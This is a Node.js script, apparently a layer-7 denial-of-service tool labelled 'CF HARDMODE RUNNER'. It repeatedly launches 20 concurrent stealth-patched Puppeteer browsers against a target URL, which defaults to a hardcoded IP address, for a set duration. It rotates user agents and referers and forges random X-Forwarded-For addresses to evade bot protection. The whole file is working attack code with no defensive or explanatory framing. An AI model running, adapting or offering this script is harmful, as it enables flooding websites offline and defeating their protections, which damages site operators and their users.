const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const fs = require('fs');

puppeteer.use(StealthPlugin());

// Load UAs and Referers
const USER_AGENTS = fs.readFileSync('ua.txt', 'utf8')
    .split('\n')
    .map(line => line.trim())
    .filter(line => line.length > 0); // Properly defined 'line' here

const REFERERS = fs.readFileSync('refs.txt', 'utf8')
    .split('\n')
    .map(line => line.trim())
    .filter(line => line.length > 0); // Properly defined 'line' here

const TARGET = process.argv[2] || 'http://198.16.110.165/';  // Use your target here
const DURATION = parseInt(process.argv[3] || 60);  // in seconds
const CONCURRENT_BROWSERS = 20;  // Hardcoded as per your request

function randomUA() {
    return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
}

function randomReferer() {
    return REFERERS[Math.floor(Math.random() * REFERERS.length)];
}

async function visitTarget(target) {
    let browser;
    try {
        console.log('Launching browser...');
        browser = await puppeteer.launch({
            headless: false,  // Run in headful mode (with a visible browser window)
            args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage'],
            timeout: 15000
        });
        console.log('Browser launched.');

        const page = await browser.newPage();
        const ua = randomUA();
        const ref = randomReferer();

        console.log(`Setting User-Agent: ${ua}`);
        await page.setUserAgent(ua);
        await page.setExtraHTTPHeaders({
            'referer': ref,
            'x-forwarded-for': Array(4).fill(0).map(() => Math.floor(Math.random() * 255)).join('.')
        });
        await page.setViewport({ width: 1280, height: 720 });

        console.log(`Navigating to target: ${target}`);
        // Wait until the page loads properly
        await page.goto(target, { waitUntil: 'networkidle2', timeout: 15000 });
        console.log('Page loaded.');

        // Wait for the page to be interactive
        await page.waitForTimeout(1500);  // Keep the tab open for 1.5s

    } catch (err) {
        console.error('Error with page load:', err);
    } finally {
        if (browser) {
            await browser.close();
            console.log('Browser closed.');
        }
    }
}

async function runAttack() {
    console.log(`\nBROWSER-NEX - CF HARDMODE RUNNER`);
    console.log('='.repeat(60));
    console.log(`TARGET: ${TARGET}`);
    console.log(`TIME:   ${DURATION}s`);
    console.log(`MODE:   BROWSER STRIKE - ${CONCURRENT_BROWSERS} Instances\n`);

    const startTime = Date.now();
    let total = 0, success = 0, errors = 0;

    while ((Date.now() - startTime) / 1000 < DURATION) {
        const tasks = [];

        for (let i = 0; i < CONCURRENT_BROWSERS; i++) {
            tasks.push(visitTarget(TARGET).then(() => {
                total++; success++;
            }).catch(() => {
                total++; errors++;
            }));
        }

        await Promise.allSettled(tasks);
        process.stdout.write(`SENT: ${total} | OK: ${success} | ERR: ${errors} | TIME: ${(Date.now() - startTime) / 1000}s\r`);
    }

    console.log('\n\nATTACK COMPLETE');
    console.log('='.repeat(60));
    console.log(`TOTAL: ${total}`);
    console.log(`SUCCESS: ${success}`);
    console.log(`ERRORS: ${errors}`);
    console.log(`DURATION: ${((Date.now() - startTime) / 1000).toFixed(1)}s`);
    console.log('='.repeat(60));
}

runAttack();
